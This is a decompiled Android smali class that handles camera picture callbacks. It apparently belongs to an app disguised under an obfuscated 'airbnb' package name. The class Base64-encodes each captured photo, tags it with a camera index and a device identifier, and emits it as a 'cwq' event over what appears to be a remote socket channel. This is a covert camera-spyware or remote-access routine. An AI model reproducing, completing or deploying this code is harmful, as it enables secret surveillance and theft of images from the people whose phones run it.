.class public final Ls0/i;
.super Ljava/lang/Object;
.source "r8-map-id-7d7ae25efe95319b69974e8de8fecbf659b28a04fb22faa5664366b60d5b8370"

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# instance fields
.field public final synthetic a:I


# direct methods
.method public constructor <init>(I)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput p1, p0, Ls0/i;->a:I

    .line 5
    .line 6
    return-void
.end method


# virtual methods
.method public final onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 2

    .line 1
    if-eqz p2, :cond_0

    .line 2
    .line 3
    :try_start_0
    invoke-virtual {p2}, Landroid/hardware/Camera;->stopPreview()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 4
    .line 5
    .line 6
    :catch_0
    invoke-virtual {p2}, Landroid/hardware/Camera;->release()V

    .line 7
    .line 8
    .line 9
    :cond_0
    const/4 p2, 0x0

    .line 10
    :try_start_1
    invoke-static {p1, p2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    .line 11
    .line 12
    .line 13
    move-result-object p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 14
    goto :goto_0

    .line 15
    :catch_1
    move-exception p1

    .line 16
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 17
    .line 18
    .line 19
    const-string p1, "null"

    .line 20
    .line 21
    :goto_0
    :try_start_2
    new-instance p2, Le2/c;

    .line 22
    .line 23
    invoke-direct {p2}, Le2/c;-><init>()V

    .line 24
    .line 25
    .line 26
    const-string v0, "a"

    .line 27
    .line 28
    const-string v1, "ca"

    .line 29
    .line 30
    invoke-virtual {p2, v0, v1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 31
    .line 32
    .line 33
    const-string v0, "im"

    .line 34
    .line 35
    invoke-static {p1}, La0/n;->j(Ljava/lang/String;)Ljava/lang/String;

    .line 36
    .line 37
    .line 38
    move-result-object p1

    .line 39
    invoke-virtual {p2, v0, p1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 40
    .line 41
    .line 42
    const-string p1, "f"

    .line 43
    .line 44
    iget v0, p0, Ls0/i;->a:I

    .line 45
    .line 46
    invoke-virtual {p2, v0, p1}, Le2/c;->f(ILjava/lang/String;)V

    .line 47
    .line 48
    .line 49
    const-string p1, "id"

    .line 50
    .line 51
    sget-object v0, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 52
    .line 53
    invoke-virtual {p2, p1, v0}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 54
    .line 55
    .line 56
    sget-object p1, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 57
    .line 58
    const-string v0, "cwq"

    .line 59
    .line 60
    invoke-virtual {p2}, Le2/c;->toString()Ljava/lang/String;

    .line 61
    .line 62
    .line 63
    move-result-object p2

    .line 64
    filled-new-array {p2}, [Ljava/lang/Object;

    .line 65
    .line 66
    .line 67
    move-result-object p2

    .line 68
    invoke-virtual {p1, v0, p2}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 69
    .line 70
    .line 71
    goto :goto_1

    .line 72
    :catch_2
    move-exception p1

    .line 73
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 74
    .line 75
    .line 76
    :goto_1
    return-void
.end method
